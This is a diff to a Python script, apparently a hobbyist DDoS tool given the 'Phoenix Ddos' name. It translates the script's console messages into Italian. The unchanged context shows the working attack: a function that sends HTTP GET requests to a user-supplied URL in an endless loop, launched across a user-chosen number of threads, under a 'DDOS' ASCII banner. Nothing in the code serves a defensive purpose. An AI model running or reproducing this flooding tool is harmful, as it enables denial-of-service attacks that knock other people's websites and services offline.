@@ -6,9 +6,9 @@ def dos(target):
     while True:
         try:
             res = requests.get(target)
-            print("Request sent!")
+            print("Richiesta Mandata!")
         except requests.exceptions.ConnectionError:
-            print("[!!!] " + "Connection error!")
+            print("[!!!] " + "Errore Di Connessione!")
  
 threads = 20
 
@@ -34,10 +34,10 @@ DDDDDDDDDDDDD      DDDDDDDDDDDDD             OOOOOOOOO      SSSSSSSSSSSSSSS
 """)
 
 
-url = input("Enter URL>> ")
+url = input("Inserisci URL>> ")
  
 try:
-    threads = int(input("Threads: "))
+    threads = int(input("Pacchetti: "))
 except ValueError:
     exit("Threads count is incorrect!")
  
@@ -53,4 +53,4 @@ if not url.__contains__("."):
 for i in range(0, threads):
     thr = threading.Thread(target=dos, args=(url,))
     thr.start()
-    print(str(i + 1) + " threads started!")
+    print(str(i + 1) + " Phoenix Ddos!")
